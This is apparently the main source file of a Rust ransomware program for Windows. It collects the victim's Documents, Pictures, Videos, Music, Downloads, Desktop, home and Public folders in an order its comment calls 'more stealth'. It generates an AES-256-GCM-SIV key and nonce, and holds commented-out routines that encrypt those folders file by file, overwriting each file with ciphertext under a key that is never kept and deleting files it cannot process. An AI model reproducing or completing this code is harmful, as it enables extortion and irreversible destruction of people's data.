mod encryption;
use aes_gcm_siv::aead::generic_array::typenum::Len;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
use dirs;
use encryption::encryptor;
use encryption::key_gen;
use fs_extra;
use rand::prelude::*;
use rand_hc::Hc128Rng;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path;
use walkdir::WalkDir;

fn main() {
    let mut common_folder_paths = Vec::new();
    load_common_folder_paths_windows(&mut common_folder_paths);

    let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());

    let key_bytes = key_gen.gen_key_bytes();
    let nonce_bytes = key_gen.gen_nonce_bytes();

    let encryptor = encryptor::Encryptor::from(key_bytes, nonce_bytes);
    /*
    for path in common_folder_paths {
        encryptor.encrypt_dir(&path);
    }
    */

    for path in common_folder_paths {
        println!("{}", path);
    }

    // Adds pictures folder path to the vec
    let public_path = match dirs::public_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    for file in WalkDir::new("C:\\Users\\Administrator\\AppData")
        .into_iter()
        .filter_map(|file| file.ok())
    {
        if file.metadata().unwrap().is_file() {
            println!("{}", file.path().display());
        }
    }
}

fn load_common_folder_paths_windows(vec: &mut Vec<String>) {
    // Adds the common folders in windows in order of importance leaving Desktop at the end to be more stealth.
    // Adds documents folder path to the vec
    let documents_path = match dirs::document_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds pictures path to the vec
    let pictures_path = match dirs::picture_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds videos folder path to the vec
    let video_path = match dirs::video_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds pictures folder path to the vec
    let audio_path = match dirs::audio_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds downloads folder path to the vec
    let downloads_path = match dirs::download_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds desktop folder path to the vec
    let desktop_path = match dirs::desktop_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    let documents_path_clone = documents_path.clone();
    let pictures_path_clone = pictures_path.clone();
    let video_path_clone = video_path.clone();
    let audio_path_clone = audio_path.clone();
    let downloads_path_clone = downloads_path.clone();
    let desktop_path_clone = desktop_path.clone();

    vec.push(documents_path);
    vec.push(pictures_path);
    vec.push(video_path);
    vec.push(audio_path);
    vec.push(desktop_path);
    vec.push(downloads_path);

    // Adds all the remaining folders in the home folder (that weren't yet added)
    match dirs::home_dir() {
        Some(path) => match path.to_str() {
            Some(home_path) => {
                for path in fs::read_dir(home_path).unwrap() {
                    let path = path.unwrap().path();
                    if path.is_dir() {
                        let path = path.display().to_string();
                        let path_split: Vec<&str> = path.split("\\").collect();
                        if path_split.last().unwrap() == &"Documents"
                            && &path == &documents_path_clone
                        {
                            continue;
                        } else if path_split.last().unwrap() == &"Pictures"
                            && &path == &pictures_path_clone
                        {
                            continue;
                        } else if path_split.last().unwrap() == &"Videos"
                            && &path == &video_path_clone
                        {
                            continue;
                        } else if path_split.last().unwrap() == &"Music"
                            && &path == &audio_path_clone
                        {
                            continue;
                        } else if path_split.last().unwrap() == &"Desktop"
                            && &path == &desktop_path_clone
                        {
                            continue;
                        } else if path_split.last().unwrap() == &"Downloads"
                            && &path == &downloads_path_clone
                        {
                            continue;
                        }

                        vec.push(path);
                    }
                }
            }
            None => (),
        },
        None => (),
    };

    // Adds public folder path to the vec
    match dirs::public_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => vec.push(path_str.to_string()),
            None => (),
        },
        None => (),
    };

    /*
    // Adds public folder path to the vec
    match dirs::data_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => vec.push(path_str.to_string()),
            None => (),
        },
        None => (),
    };

    // Adds public folder path to the vec
    match dirs::data_local_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => vec.push(path_str.to_string()),
            None => (),
        },
        None => (),
    };*/

    //map.insert("")
}

/*
fn encrypt(plain_text: &Vec<u8>) -> Vec<u8> {
    let mut rng = Hc128Rng::from_entropy();
    let mut key_bytes: [u8; 32] = [0; 32];
    let mut nonce_bytes: [u8; 12] = [0; 12];
    rng.fill_bytes(&mut key_bytes);
    rng.fill_bytes(&mut nonce_bytes);

    let key = Key::from_slice(&key_bytes);
    let cipher = Aes256GcmSiv::new(key);
    let nonce = Nonce::from_slice(&nonce_bytes);

    match cipher.encrypt(&nonce, plain_text.as_ref()) {
        Ok(encrypted_text) => encrypted_text,
        Err(_) => vec![],
    }
}

fn encrypt_file(path: &path::PathBuf) {
    let bytes_to_encrypt = match fs::read(&path) {
        Ok(bytes) => bytes,
        Err(_) => {
            attempt_delete_file(&path);
            return;
        }
    };
    let bytes_encrypted = encrypt(&bytes_to_encrypt);

    match fs::write(&path, bytes_encrypted) {
        Ok(_) => (),
        Err(_) => {
            attempt_delete_file(&path);
        }
    };
}

fn attempt_delete_file(path: &path::PathBuf) {
    match fs::remove_file(path) {
        Ok(_) => (),
        Err(_) => (),
    };
}
*/
